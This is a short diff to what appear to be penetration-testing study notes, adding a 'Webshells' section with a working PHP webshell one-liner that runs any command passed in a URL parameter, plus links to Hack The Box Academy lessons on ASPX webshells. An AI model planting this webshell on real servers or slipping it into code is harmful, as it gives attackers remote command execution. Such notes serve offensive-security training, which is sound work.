@@ -55,3 +55,16 @@ $ export SHELL=bash
 $ export TERM=xterm-256color
 $ stty rows <num> columns <cols>
 ```
+
+Webshells:
+
+PHP Webshell one-liner:
+```
+<?php system($_GET['cmd']); ?>
+#accessing via http(s)://<ip>/shell.php?cmd=<cmd>
+```
+ASPX-Webshell:
+```
+Laudanum: https://academy.hackthebox.com/app/module/115/section/1122
+Antak: https://academy.hackthebox.com/app/module/115/section/1124
+```
